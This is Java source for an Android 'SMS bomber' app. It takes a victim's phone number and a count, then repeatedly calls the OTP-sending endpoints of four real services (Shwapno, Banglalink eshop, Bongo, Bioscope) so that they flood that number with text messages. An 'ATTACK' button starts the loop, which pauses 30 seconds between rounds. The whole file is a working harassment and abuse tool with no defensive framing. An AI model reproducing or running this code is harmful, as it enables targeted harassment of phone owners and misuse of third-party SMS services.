package com.example.smsbomber;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private EditText numberEditText, amountEditText;
    private Button attackButton;
    private TextView resultTextView;
    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_main);

        numberEditText = findViewById(R.id.text1);
        amountEditText = findViewById(R.id.text2);
        attackButton = findViewById(R.id.click);
        resultTextView = findViewById(R.id.tView);
        attackButton.setOnClickListener(this);
        progressBar = findViewById(R.id.progressBar);
        progressBar.setVisibility(View.INVISIBLE);
        resultTextView.setText("");

        // Declaring a layout (changes are to be made to this)
        // Declaring a textview (which is inside the layout)
        SwipeRefreshLayout swipeRefreshLayout = (SwipeRefreshLayout)findViewById(R.id.refreshLayout);

        // Refresh  the layout
        swipeRefreshLayout.setOnRefreshListener(
                new SwipeRefreshLayout.OnRefreshListener() {
                    @Override
                    public void onRefresh() {
                        numberEditText.setText("");
                        amountEditText.setText("");
                        attackButton.setBackgroundColor(Color.parseColor("#DE1E1E"));
                        attackButton.setText("ATTACK");
                        resultTextView.setText("");
                        attackButton.setEnabled(true);
                        swipeRefreshLayout.setRefreshing(false);
                        progressBar.setVisibility(View.INVISIBLE);
                    }
                }
        );


        if (!isNetworkAvailable()) {
            Toast.makeText(MainActivity.this, "Please Connect Internet", Toast.LENGTH_SHORT);
        }


    }

    @Override
    public void onClick(View v) {

        try {
            if (v.getId() == R.id.click) {
                String mobile = numberEditText.getText().toString();
                String amnt = amountEditText.getText().toString();
                if (mobile.equals("") || amnt.equals("")) {
                    Toast.makeText(MainActivity.this, "Enter Valid Number or Amount", Toast.LENGTH_SHORT).show();
                    return;
                } else {
                    attackButton.setBackgroundColor(Color.parseColor("#FF03A9F4"));

                    attackButton.setEnabled(false);
                    progressBar.setVisibility(View.VISIBLE);
                    int amount = Integer.parseInt(amnt);

                    Thread thread = new Thread(){
                        @Override
                        synchronized public void run() {
                            attackButton.setText("Wait");
                            int amt = (amount+1)/4;
                            for (int i = 0; i < amt; i++) {
                                swapnoApi(mobile);
                                blshopApi(mobile);
                                bongobdApi(mobile);
                                bioscopeApi(mobile);
                                try {
                                    sleep(30000);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }

                            }
                            attackButton.setText("Succeed");
                            resultTextView.setText("Swipe Down to Refresh");
                            progressBar.setVisibility(View.INVISIBLE);
                        }
                    };
                    thread.start();
                    //thread.join();

//                    Thread nThread = new Thread(){
//                        @Override
//                        synchronized public void run() {
//                            attackButton.setText("Wait");
//                            try {
//                                sleep(5000);
//                            } catch (InterruptedException e) {
//                                e.printStackTrace();
//                            }
//                            attackButton.setText("Succeed");
//                            resultTextView.setText("Swipe Down to Refresh");
//                            progressBar.setVisibility(View.INVISIBLE);
//
//                        }
//                    };
//                    nThread.start();
                }

            }
        } catch (Exception e) {
            resultTextView.setText("Unsuccessfull");
        }

    }

    private void swapnoApi(String mobile) {
        String url = String.valueOf("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=" + mobile + "&countryPhoneCode=%2B88");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        });
        queue.add(stringRequest);
    }

    private void blshopApi(String mobile) {
        String url = String.valueOf("https://eshop.banglalink.net/wp-admin/admin-ajax.php");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        }) {
            @Override
            public String getBodyContentType() {
                return "application/x-www-form-urlencoded; charset=UTF-8";
            }

            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("action", "otpRegistration");
                params.put("otpMobile", mobile);
                return params;
            }

        };
        queue.add(stringRequest);
    }

    private void bongobdApi(String mobile) {
        // url to post our data
        String url = "https://api.bongo-solutions.com/auth/api/login/send-otp";

        // creating a new variable for our request queue
        RequestQueue queue = Volley.newRequestQueue(MainActivity.this);

        StringRequest request = new StringRequest(Request.Method.POST, url, new com.android.volley.Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                // on below line we are displaying a success toast message.
                //Toast.makeText(MainActivity.this, "Data added to API", Toast.LENGTH_SHORT).show();
                try {
                    // on below line we are passing our response
                    // to json object to extract data from it.
                    JSONObject respObj = new JSONObject(response);

                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }, new com.android.volley.Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // method to handle errors.
                //Toast.makeText(MainActivity.this, "Fail to get response = " + error, Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                // below line we are creating a map for
                // storing our values in key and value pair.
                Map<String, String> params = new HashMap<String, String>();

                // on below line we are passing our key
                // and value pair to our parameters.
                params.put("operator", "all");
                params.put("msisdn", String.valueOf("88" + mobile));
                // at last we are
                // returning our params.
                return params;
            }
        };
        // below line is to make
        // a json object request.
        queue.add(request);
    }

    private void bioscopeApi(String mobile) {
        String url = String.valueOf("https://www.bioscopelive.com/bn/login/send-otp?phone=88" + mobile + "&operator=bd-otp");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        });
        queue.add(stringRequest);
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater menuInflater = getMenuInflater();
        menuInflater.inflate(R.menu.menu_2layout, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.srid) {
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            String subject = "Anything what you want";
            String body = "So much important app !!";
            intent.putExtra(Intent.EXTRA_SUBJECT, subject);
            intent.putExtra(Intent.EXTRA_TEXT, body);
            startActivity(Intent.createChooser(intent, "Share with"));
        }
        if (item.getItemId() == R.id.usid) {
            Intent intent = new Intent(this, AboutUs.class);
            startActivity(intent);

        }
        return super.onOptionsItemSelected(item);
    }

}